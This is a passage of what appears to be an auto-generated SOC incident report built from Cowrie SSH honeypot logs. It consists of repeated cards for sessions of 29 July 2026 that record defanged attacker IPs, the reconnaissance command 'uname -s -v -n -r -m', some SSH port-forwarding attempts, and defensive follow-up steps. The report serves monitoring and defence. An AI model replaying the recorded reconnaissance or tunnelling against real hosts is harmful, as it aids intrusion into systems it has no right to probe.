| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:58:55` | `cowrie.session.connect` |
| `2026-07-29 16:58:55` | `cowrie.client.version` |
| `2026-07-29 16:58:55` | `cowrie.client.kex` |
| `2026-07-29 16:58:55` | `cowrie.login.success` |
| `2026-07-29 16:58:56` | `cowrie.session.params` |
| `2026-07-29 16:58:56` | `cowrie.command.input` |
| `2026-07-29 16:58:56` | `cowrie.log.closed` |
| `2026-07-29 16:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7decba520a65

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:02` | `cowrie.session.connect` |
| `2026-07-29 16:59:02` | `cowrie.client.version` |
| `2026-07-29 16:59:02` | `cowrie.client.kex` |
| `2026-07-29 16:59:02` | `cowrie.login.success` |
| `2026-07-29 16:59:03` | `cowrie.session.params` |
| `2026-07-29 16:59:03` | `cowrie.command.input` |
| `2026-07-29 16:59:03` | `cowrie.log.closed` |
| `2026-07-29 16:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-789e5460c040

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:08` | `cowrie.session.connect` |
| `2026-07-29 16:59:08` | `cowrie.client.version` |
| `2026-07-29 16:59:08` | `cowrie.client.kex` |
| `2026-07-29 16:59:09` | `cowrie.login.success` |
| `2026-07-29 16:59:10` | `cowrie.session.params` |
| `2026-07-29 16:59:10` | `cowrie.command.input` |
| `2026-07-29 16:59:10` | `cowrie.log.closed` |
| `2026-07-29 16:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd7ea6d73ca1

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:10` | `cowrie.session.connect` |
| `2026-07-29 16:59:10` | `cowrie.client.version` |
| `2026-07-29 16:59:10` | `cowrie.client.kex` |
| `2026-07-29 16:59:11` | `cowrie.login.success` |
| `2026-07-29 16:59:12` | `cowrie.direct-tcpip.request` |
| `2026-07-29 16:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374961eefdde

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:15` | `cowrie.session.connect` |
| `2026-07-29 16:59:15` | `cowrie.client.version` |
| `2026-07-29 16:59:15` | `cowrie.client.kex` |
| `2026-07-29 16:59:15` | `cowrie.login.success` |
| `2026-07-29 16:59:16` | `cowrie.session.params` |
| `2026-07-29 16:59:16` | `cowrie.command.input` |
| `2026-07-29 16:59:16` | `cowrie.log.closed` |
| `2026-07-29 16:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a46feb7cca51

| Field | Detail |
|---|---|
| **Source IP** | `36.92.35[.]211` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:17` | `cowrie.session.connect` |
| `2026-07-29 16:59:18` | `cowrie.client.version` |
| `2026-07-29 16:59:18` | `cowrie.client.kex` |
| `2026-07-29 16:59:21` | `cowrie.login.success` |
| `2026-07-29 16:59:23` | `cowrie.direct-tcpip.request` |
| `2026-07-29 16:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.35[.]211` to AbuseIPDB if not already reported
- [ ] Block `36.92.35[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4fbb68cef74

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:21` | `cowrie.session.connect` |
| `2026-07-29 16:59:22` | `cowrie.client.version` |
| `2026-07-29 16:59:22` | `cowrie.client.kex` |
| `2026-07-29 16:59:22` | `cowrie.login.success` |
| `2026-07-29 16:59:23` | `cowrie.session.params` |
| `2026-07-29 16:59:23` | `cowrie.command.input` |
| `2026-07-29 16:59:23` | `cowrie.log.closed` |
| `2026-07-29 16:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc06357ad1bb

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:28` | `cowrie.session.connect` |
| `2026-07-29 16:59:28` | `cowrie.client.version` |
| `2026-07-29 16:59:28` | `cowrie.client.kex` |
| `2026-07-29 16:59:29` | `cowrie.login.success` |
| `2026-07-29 16:59:30` | `cowrie.session.params` |
| `2026-07-29 16:59:30` | `cowrie.command.input` |
| `2026-07-29 16:59:30` | `cowrie.log.closed` |
| `2026-07-29 16:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb7e86ad5791

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:35` | `cowrie.session.connect` |
| `2026-07-29 16:59:35` | `cowrie.client.version` |
| `2026-07-29 16:59:35` | `cowrie.client.kex` |
| `2026-07-29 16:59:36` | `cowrie.login.success` |
| `2026-07-29 16:59:36` | `cowrie.session.params` |
| `2026-07-29 16:59:36` | `cowrie.command.input` |
| `2026-07-29 16:59:37` | `cowrie.log.closed` |
| `2026-07-29 16:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a46c23b8d5ea

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:42` | `cowrie.session.connect` |
| `2026-07-29 16:59:42` | `cowrie.client.version` |
| `2026-07-29 16:59:42` | `cowrie.client.kex` |
| `2026-07-29 16:59:43` | `cowrie.login.success` |
| `2026-07-29 16:59:44` | `cowrie.session.params` |
| `2026-07-29 16:59:44` | `cowrie.command.input` |
| `2026-07-29 16:59:44` | `cowrie.log.closed` |
| `2026-07-29 16:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87e524956a00

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:49` | `cowrie.session.connect` |
| `2026-07-29 16:59:49` | `cowrie.client.version` |
| `2026-07-29 16:59:49` | `cowrie.client.kex` |
| `2026-07-29 16:59:49` | `cowrie.login.success` |
| `2026-07-29 16:59:50` | `cowrie.session.params` |
| `2026-07-29 16:59:50` | `cowrie.command.input` |
| `2026-07-29 16:59:50` | `cowrie.log.closed` |
| `2026-07-29 16:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-782a71c021e7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:59 |
| **Last Seen** | 2026-07-29 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:59:55` | `cowrie.session.connect` |
| `2026-07-29 16:59:55` | `cowrie.client.version` |
| `2026-07-29 16:59:55` | `cowrie.client.kex` |
| `2026-07-29 16:59:55` | `cowrie.login.success` |
| `2026-07-29 16:59:56` | `cowrie.session.params` |
| `2026-07-29 16:59:56` | `cowrie.command.input` |
| `2026-07-29 16:59:56` | `cowrie.log.closed` |
| `2026-07-29 16:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b1765935f4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:00 |
| **Last Seen** | 2026-07-29 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:00:02` | `cowrie.session.connect` |
| `2026-07-29 17:00:02` | `cowrie.client.version` |
| `2026-07-29 17:00:02` | `cowrie.client.kex` |
| `2026-07-29 17:00:02` | `cowrie.login.success` |
| `2026-07-29 17:00:03` | `cowrie.session.params` |
| `2026-07-29 17:00:03` | `cowrie.command.input` |
| `2026-07-29 17:00:03` | `cowrie.log.closed` |
| `2026-07-29 17:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e411498379b7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:00 |
| **Last Seen** | 2026-07-29 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:00:09` | `cowrie.session.connect` |
| `2026-07-29 17:00:09` | `cowrie.client.version` |
| `2026-07-29 17:00:09` | `cowrie.client.kex` |
| `2026-07-29 17:00:09` | `cowrie.login.success` |
| `2026-07-29 17:00:10` | `cowrie.session.params` |
| `2026-07-29 17:00:10` | `cowrie.command.input` |
| `2026-07-29 17:00:10` | `cowrie.log.closed` |
| `2026-07-29 17:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e671550a8f57

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:00 |
| **Last Seen** | 2026-07-29 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:00:16` | `cowrie.session.connect` |
| `2026-07-29 17:00:16` | `cowrie.client.version` |
| `2026-07-29 17:00:16` | `cowrie.client.kex` |
| `2026-07-29 17:00:16` | `cowrie.login.success` |
| `2026-07-29 17:00:17` | `cowrie.session.params` |
| `2026-07-29 17:00:17` | `cowrie.command.input` |
| `2026-07-29 17:00:17` | `cowrie.log.closed` |
| `2026-07-29 17:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5773e9bbf86e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:00 |
| **Last Seen** | 2026-07-29 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:00:23` | `cowrie.session.connect` |
| `2026-07-29 17:00:23` | `cowrie.client.version` |
| `2026-07-29 17:00:23` | `cowrie.client.kex` |
| `2026-07-29 17:00:23` | `cowrie.login.success` |
| `2026-07-29 17:00:24` | `cowrie.session.params` |
| `2026-07-29 17:00:24` | `cowrie.command.input` |
| `2026-07-29 17:00:24` | `cowrie.log.closed` |
| `2026-07-29 17:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c01349fa2b58

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:00 |
| **Last Seen** | 2026-07-29 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:00:29` | `cowrie.session.connect` |
| `2026-07-29 17:00:29` | `cowrie.client.version` |
| `2026-07-29 17:00:29` | `cowrie.client.kex` |
| `2026-07-29 17:00:29` | `cowrie.login.success` |
| `2026-07-29 17:00:30` | `cowrie.session.params` |
| `2026-07-29 17:00:30` | `cowrie.command.input` |
| `2026-07-29 17:00:30` | `cowrie.log.closed` |
| `2026-07-29 17:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e32747535d9

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:00 |
| **Last Seen** | 2026-07-29 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:00:36` | `cowrie.session.connect` |
| `2026-07-29 17:00:36` | `cowrie.client.version` |
| `2026-07-29 17:00:36` | `cowrie.client.kex` |
| `2026-07-29 17:00:36` | `cowrie.login.success` |
| `2026-07-29 17:00:38` | `cowrie.session.params` |
| `2026-07-29 17:00:38` | `cowrie.command.input` |
| `2026-07-29 17:00:38` | `cowrie.log.closed` |
| `2026-07-29 17:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51acbcb0a115

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:00 |
| **Last Seen** | 2026-07-29 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:00:43` | `cowrie.session.connect` |
| `2026-07-29 17:00:43` | `cowrie.client.version` |
| `2026-07-29 17:00:43` | `cowrie.client.kex` |
| `2026-07-29 17:00:44` | `cowrie.login.success` |
| `2026-07-29 17:00:45` | `cowrie.session.params` |
| `2026-07-29 17:00:45` | `cowrie.command.input` |
| `2026-07-29 17:00:45` | `cowrie.log.closed` |
| `2026-07-29 17:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d9ced86bf34

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:00 |
| **Last Seen** | 2026-07-29 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:00:50` | `cowrie.session.connect` |
| `2026-07-29 17:00:50` | `cowrie.client.version` |
| `2026-07-29 17:00:50` | `cowrie.client.kex` |
| `2026-07-29 17:00:51` | `cowrie.login.success` |
| `2026-07-29 17:00:52` | `cowrie.session.params` |
| `2026-07-29 17:00:52` | `cowrie.command.input` |
| `2026-07-29 17:00:52` | `cowrie.log.closed` |
| `2026-07-29 17:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-480421e80449

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:00 |
| **Last Seen** | 2026-07-29 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:00:57` | `cowrie.session.connect` |
| `2026-07-29 17:00:57` | `cowrie.client.version` |
| `2026-07-29 17:00:57` | `cowrie.client.kex` |
| `2026-07-29 17:00:58` | `cowrie.login.success` |
| `2026-07-29 17:00:59` | `cowrie.session.params` |
| `2026-07-29 17:00:59` | `cowrie.command.input` |
| `2026-07-29 17:00:59` | `cowrie.log.closed` |
| `2026-07-29 17:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d93b6be731af

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:01 |
| **Last Seen** | 2026-07-29 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:01:04` | `cowrie.session.connect` |
| `2026-07-29 17:01:04` | `cowrie.client.version` |
| `2026-07-29 17:01:04` | `cowrie.client.kex` |
| `2026-07-29 17:01:05` | `cowrie.login.success` |
| `2026-07-29 17:01:05` | `cowrie.session.params` |
| `2026-07-29 17:01:05` | `cowrie.command.input` |
| `2026-07-29 17:01:06` | `cowrie.log.closed` |
| `2026-07-29 17:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b22de28f17bf

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:01 |
| **Last Seen** | 2026-07-29 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:01:11` | `cowrie.session.connect` |
| `2026-07-29 17:01:11` | `cowrie.client.version` |
| `2026-07-29 17:01:11` | `cowrie.client.kex` |
| `2026-07-29 17:01:11` | `cowrie.login.success` |
| `2026-07-29 17:01:12` | `cowrie.session.params` |
| `2026-07-29 17:01:12` | `cowrie.command.input` |
| `2026-07-29 17:01:12` | `cowrie.log.closed` |
| `2026-07-29 17:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-450f18d80dcb

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:01 |
| **Last Seen** | 2026-07-29 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:01:17` | `cowrie.session.connect` |
| `2026-07-29 17:01:17` | `cowrie.client.version` |
| `2026-07-29 17:01:17` | `cowrie.client.kex` |
| `2026-07-29 17:01:17` | `cowrie.login.success` |
| `2026-07-29 17:01:18` | `cowrie.session.params` |
| `2026-07-29 17:01:18` | `cowrie.command.input` |
| `2026-07-29 17:01:18` | `cowrie.log.closed` |
| `2026-07-29 17:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ecbfdeb9e04

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 17:01 |
| **Last Seen** | 2026-07-29 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:01:24` | `cowrie.session.connect` |
| `2026-07-29 17:01:24` | `cowrie.client.version` |
| `2026-07-29 17:01:24` | `cowrie.client.kex` |
| `2026-07-29 17:01:24` | `cowrie.login.success` |
| `2026-07-29 17:01:25` | `cowrie.session.params` |
| `2026-07-29 17:01:25` | `cowrie.command.input` |
| `2026-07-29 17:01:25` | `cowrie.log.closed` |
| `2026-07-29 17:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-051f0718dfed

| Field | Detail |
|---|---|
| **Source IP** | `181.129.31[.]42` |
| **First Seen** | 2026-07-29 17:01 |
| **Last Seen** | 2026-07-29 17:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:01:40` | `cowrie.session.connect` |
| `2026-07-29 17:01:40` | `cowrie.client.version` |
| `2026-07-29 17:01:40` | `cowrie.client.kex` |
| `2026-07-29 17:01:42` | `cowrie.login.success` |
| `2026-07-29 17:01:42` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.129.31[.]42` to AbuseIPDB if not already reported
- [ ] Block `181.129.31[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
